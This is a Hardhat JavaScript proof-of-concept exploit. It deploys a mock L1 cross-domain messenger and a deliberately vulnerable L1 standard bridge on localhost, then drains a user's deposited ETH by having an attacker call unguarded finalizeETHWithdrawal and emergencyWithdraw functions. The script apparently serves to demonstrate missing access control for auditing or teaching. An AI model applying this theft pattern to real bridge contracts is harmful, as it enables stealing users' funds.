import { ethers } from "hardhat";

async function main() {
  console.log("> npx hardhat run scripts/exploit-direct-theft.js --network localhost");
  console.log("\nStarting Direct Fund Theft Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy messenger mock
  const MessengerMock = await ethers.getContractFactory("L1CrossDomainMessengerMock");
  const messenger = await MessengerMock.deploy();
  await messenger.deployed();
  console.log(`L1CrossDomainMessengerMock deployed at: ${messenger.address}`);
  
  // Deploy L2 bridge mock (just for reference)
  const L2BridgeMock = await ethers.getContractFactory("L2BridgeMock");
  const l2Bridge = await L2BridgeMock.deploy();
  await l2Bridge.deployed();
  console.log(`L2BridgeMock deployed at: ${l2Bridge.address}`);
  
  // Deploy vulnerable bridge
  const VulnerableBridge = await ethers.getContractFactory("VulnerableL1StandardBridge");
  const bridge = await VulnerableBridge.deploy(messenger.address, l2Bridge.address);
  await bridge.deployed();
  console.log(`VulnerableL1StandardBridge deployed at: ${bridge.address}`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // User deposits ETH to the bridge
  const depositAmount = ethers.utils.parseEther("10");
  await user1.sendTransaction({
    to: bridge.address,
    value: depositAmount
  });
  console.log(`User deposited ${ethers.utils.formatEther(depositAmount)} ETH to the bridge`);
  
  // Check initial balances
  const initialBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`Initial bridge balance: ${ethers.utils.formatEther(initialBridgeBalance)} ETH`);
  console.log(`Initial attacker balance: ${ethers.utils.formatEther(initialAttackerBalance)} ETH`);
  
  // Execute the attack - direct call to finalize withdrawal
  console.log("\nExecuting the direct fund theft attack...");
  
  // Method 1: Call finalizeETHWithdrawal directly without any authentication
  const stealAmount = ethers.utils.parseEther("5");
  const tx1 = await bridge.connect(attacker).finalizeETHWithdrawal(
    user1.address, // from (in a real scenario this is the rightful owner)
    attacker.address, // to (the attacker's address)
    stealAmount // amount to steal
  );
  await tx1.wait();
  console.log(`Attack 1: Called finalizeETHWithdrawal to steal ${ethers.utils.formatEther(stealAmount)} ETH`);
  
  // Method 2: Call the emergency withdraw function with no access control
  const emergencyAmount = ethers.utils.parseEther("5");
  const tx2 = await bridge.connect(attacker).emergencyWithdraw(
    attacker.address,
    emergencyAmount
  );
  await tx2.wait();
  console.log(`Attack 2: Called emergencyWithdraw to steal ${ethers.utils.formatEther(emergencyAmount)} ETH`);
  
  // Check final balances
  const finalBridgeBalance = await ethers.provider.getBalance(bridge.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  // Adjust for gas costs by just looking at bridge balance changes
  console.log(`Final bridge balance: ${ethers.utils.formatEther(finalBridgeBalance)} ETH`);
  console.log(`Final attacker balance (minus gas costs): ~${ethers.utils.formatEther(finalAttackerBalance)} ETH`);
  
  const stolenAmount = initialBridgeBalance.sub(finalBridgeBalance);
  console.log(`Total stolen from bridge: ${ethers.utils.formatEther(stolenAmount)} ETH`);
  
  // Verify the attack was successful
  if (stolenAmount.gt(ethers.utils.parseEther("0"))) {
    console.log("\n✅ ATTACK SUCCESSFUL: Funds were directly stolen");
  } else {
    console.log("\n❌ ATTACK FAILED: No funds were stolen");
  }
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;
